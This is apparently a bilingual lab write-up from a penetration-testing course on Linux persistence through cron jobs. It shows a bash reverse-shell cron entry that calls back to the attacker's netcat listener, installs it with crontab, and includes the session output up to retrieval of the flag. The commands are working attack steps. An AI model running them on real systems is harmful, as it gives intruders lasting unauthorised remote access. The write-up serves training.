---
layout: post
title: "Persistence Via Cron Jobs"
date: "2023-07-08"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Persistence
## Persistence Via Cron Jobs
Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.

An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job.

We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

## Anatomy Of A Cron Job
![anatomy-of-a-cron-job.png](/img/in-post/ine/anatomy-of-a-cron-job.png)

`* * * * *` means that cron jobs will run every minute of every hour of every day of every month and every day of the week.

# Linux持久性
## 通过计划任务实现持久性
Linux通过一个叫做Cron的实用程序实现任务调度。Cron是一个基于时间的服务，可以在指定的时间表上重复运行应用程序、脚本和其他命令。

已经配置为使用Cron重复运行的应用程序或脚本称为Cron作业。

我们可以使用Cron作业在固定的时间间隔内执行命令或脚本，以确保我们持久地访问目标系统。

## Cron作业的组成
![anatomy-of-a-cron-job.png](/img/in-post/ine/anatomy-of-a-cron-job.png)

`* * * * *` 表示Cron作业将在每个月的每一天、每个小时的每一分钟以及每周的每一天运行。

# Demo: Persistence Via Cron Jobs (演示：通过计划任务实现持久性)
We can then SSH into the target system. And this is going to emulate the exploitation phase. Once we have gained access to the target system, we can create the Cron Job that will connect to our Netcat listener. And after that is done, we can then exit from the target system and set up our listener. And we should receive a reverse shell connection.

Kali Linux : 192.166.95.2

Target IP Address : 192.166.95.3

```
ssh student@192.166.95.3

password
```

we're focusing on setting up a cron job.

We can list out the contents of the home directory. Once we have set up our cron job, we can remove this wait binary to simulate what would happen if the student user account password was changed, therefore, meaning that we could not gain access to the target system anymore, because we don't know the new password.

```
ls -al

wait
```

We can enumerate the various cron jobs by

```
cat /etc/cron*
```

`/etc/crontab`: The crontab file is where you can add new cron job.

In order to create a cron job, we can create a simple cron file and then add the cron file to the crontab file.

`&`: ampersand. descriptor.

```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.166.95.2/1234 0>&1'" > cron
```

这条命令会将一个Cron作业写入到名为"cron"的文件中。该作业定义了一个在每分钟运行一次的计划任务，任务内容是在后台通过Bash shell执行一个命令。该命令将会建立一个TCP连接到IP地址为192.166.95.2，端口号为1234的主机，并将Bash shell的标准输入和输出重定向到该连接。这个命令的目的是在目标主机上运行一个反向Shell，以便攻击者可以在远程控制目标主机。请注意，这个命令可能会被用于非法活动，因此请谨慎使用或避免使用。

This command writes a cron job to a file named "cron". The job is scheduled to run every minute and it executes a command that spawns a reverse shell to a remote host. Specifically, the command launches a Bash shell in the background and connects it to the IP address 192.166.95.2 on port 1234 via TCP. It then redirects the input and output of the Bash shell to the network connection. This command is typically used for malicious purposes and can be used to gain unauthorized access to a remote system, so it should be used with caution or avoided altogether.

```
cat cron
```

`crontab -i`: add this cron job. This will add it as a cron job.

```
crontab -i cron
```

这个命令会将名为"cron"的文件中的Cron作业添加到当前用户的Cron表中。"-i"选项会在添加作业之前先提示用户确认。因此，这个命令会打开当前用户的Cron表进行编辑，用户可以查看并确认要添加的作业。如果用户确认添加，则该作业将被添加到Cron表中并在计划时间自动运行。该命令的目的是将之前创建的反向Shell任务添加到计划任务中，以便在目标主机上启动反向Shell。请注意，这个命令可能会被用于非法活动，因此请谨慎使用或避免使用。

This command adds a cron job from the "cron" file to the current user's crontab. The "-i" option prompts the user for confirmation before adding the job. Therefore, this command opens the user's crontab for editing, allowing the user to review and confirm the job to be added. If confirmed, the job will be added to the crontab and will run automatically at the scheduled time. The purpose of this command is to add the previously created reverse shell task to the scheduled tasks, in order to start a reverse shell on the target host. Note that this command is typically used for malicious purposes and should be used with caution or avoided altogether.

We can view the list of cron jobs by:

```
crontab -l
```

Our cron job has been added for the student user account. And that means that it will be executed with the permissions, pertinent to the student account. If you have access to the target system and have elevated your privileges, then set up the cron job with the root user, because you'll receive access to the target system as the user that you used to create the cron job.

这个命令会列出当前用户的Cron表中所有的计划任务。它会输出每个任务的执行时间、执行命令以及一些其他信息。该命令的目的是为了查看当前用户的Cron表中是否已经成功添加了反向Shell任务。如果反向Shell任务已经添加成功，那么它应该会在列表中出现。如果反向Shell任务没有出现，那么可能是添加任务时发生了错误，或者任务被其他程序或用户删除了。

This command lists all scheduled tasks in the current user's crontab. It outputs the execution time, command to be executed, and some additional information for each task. The purpose of this command is to check whether the reverse shell task has been successfully added to the current user's crontab. If the reverse shell task has been successfully added, it should appear in the list. If it does not appear, it may be due to an error during the task creation or because the task was deleted by another program or user.

Now that this is done, the cron job is going to be running in the background every minute.

```
ls
rm wait
```

Our connection will be reset. And the student user account password will be changed.

```
ssh student@192.166.95.3

password
```

Permission denied. This simulates what would happen if we lost access to the target.

However, if we set up persistence, we can set up our netcat listener.

```
nc -nvlp 1234
```

The cron job gets executed on the target system. And it provides us with access to the student account on the target system, because the cron job ran and it executed the bash reverse shell command that connected to our Netcat listener.

```
ls -al
cat flag.txt
```

That is how to establish persistence on a Linux target system through the use of cron job.

```
nc -nvlp 1234
```

# T1168: Local Job Scheduling T1168：本地作业计划 
## Overview  概述 
Local Job Scheduling refers to the ability to create pre-scheduled and periodic background jobs using various mechanism (e.g cron, launchd).

本地作业调度是指使用各种机制（例如 cron、启动）创建预先调度和定期后台作业的能力。

In this lab, we are given SSH access on the target machine. The flag is not on the machine yet and will only be available in the user's home directory after "wait" file present in the user's home directory is deleted. However, the deletion of this file will change the user password and restart SSH. Hence, to retrieve the flag, you have to maintain access on the target system. 

在本练习中，我们获得了目标计算机上的 SSH 访问权限。该标志尚未在计算机上，只有在删除用户主目录中存在的“wait”文件后，该标志才在用户的主目录中可用。但是，删除此文件将更改用户密码并重新启动 SSH。因此，要检索该标志，您必须保持对目标系统的访问。

Initial SSH Credentials  初始 SSH 凭据 

| Username | Password | | student | password |

Your mission: 您的任务： 

Maintain access on the target machine after the credentials are modified. Schedule a popular HTTP python server module to achieve this.

修改凭据后，保持对目标计算机的访问权限。安排一个流行的HTTP python服务器模块来实现这一点。

Retrieve flag from the target machine.

从目标计算机检索标志。

References:  引用： 

Local Job Scheduling (https://attack.mitre.org/techniques/T1168/)

本地作业计划 （https://attack.mitre.org/techniques/T1168/）

## Solutions  解决方案 
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1553.pdf

本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-1553.pdf

## 复现视频内容
Kali Linux : 192.243.230.2

Target IP Address : 192.243.230.3

```
root@attackdefense:~# ssh student@192.243.230.3
The authenticity of host '192.243.230.3 (192.243.230.3)' can't be established.
ECDSA key fingerprint is SHA256:XJKT3cfY7eUyGE+ANUXJUbujx9do/cm94BuQBcOWoho.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.243.230.3' (ECDSA) to the list of known hosts.
student@192.243.230.3's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

student@victim-1:~$ pwd
/home/student
student@victim-1:~$ ls -al
total 20
drwxr-xr-x 1 student student 4096 Jul  8 02:21 .
drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
drwx------ 2 student student 4096 Jul  8 02:21 .cache
-rw-r--r-- 1 student student   91 Apr 26  2019 wait
```

```
student@victim-1:~$ id
uid=999(student) gid=999(student) groups=999(student)
student@victim-1:~$ whoami
student
student@victim-1:~$ ps -eaf
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 03:02 ?        00:00:00 /bin/bash /start.sh
root           7       1  0 03:02 ?        00:00:00 /bin/sh /usr/bin/intervene/manage.sh
root           8       1  0 03:02 ?        00:00:00 /usr/bin/python /usr/bin/supervisord -n
root          22       1  0 03:02 ?        00:00:00 /usr/sbin/sshd
root          26       1  0 03:02 ?        00:00:00 /usr/sbin/cron
root          56      22  0 03:04 ?        00:00:00 sshd: student [priv]
student       71      56  0 03:05 ?        00:00:00 sshd: student@pts/0
student       72      71  0 03:05 pts/0    00:00:00 -bash
root          90       7  0 03:06 ?        00:00:00 sleep 5
student       91      72  0 03:06 pts/0    00:00:00 ps -eaf
```

```
student@victim-1:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

```
student@victim-1:~$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.243.230.2/1234 0>&1'" > cron
student@victim-1:~$ cat cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.243.230.2/1234 0>&1'
student@victim-1:~$ crontab -i cron
student@victim-1:~$ crontab -l
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.243.230.2/1234 0>&1'
```

```
student@victim-1:~$ ls
cron  wait
student@victim-1:~$ rm wait
student@victim-1:~$ Connection to 192.243.230.3 closed by remote host.
Connection to 192.243.230.3 closed.
root@attackdefense:~# ssh student@192.243.230.3
student@192.243.230.3's password: 
Permission denied, please try again.
student@192.243.230.3's password: 
Permission denied, please try again.
student@192.243.230.3's password: 
student@192.243.230.3: Permission denied (publickey,password).
```

```
root@attackdefense:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.243.230.2] from (UNKNOWN) [192.243.230.3] 45422
bash: cannot set terminal process group (330): Inappropriate ioctl for device
bash: no job control in this shell
student@victim-1:~$ ls -al
ls -al
total 28
drwxr-xr-x 1 student student 4096 Jul  8 02:36 .
drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
drwx------ 2 student student 4096 Jul  8 02:21 .cache
-rw-rw-r-- 1 student student   69 Jul  8 02:28 cron
-rw-r--r-- 1 root    root      34 Apr 26  2019 flag.txt
student@victim-1:~$ cat flag.txt
cat flag.txt
79969e32981f722464fde4ce7f208883
student@victim-1:~$ whoami
whoami
student
student@victim-1:~$ id
id
uid=999(student) gid=999(student) groups=999(student)
```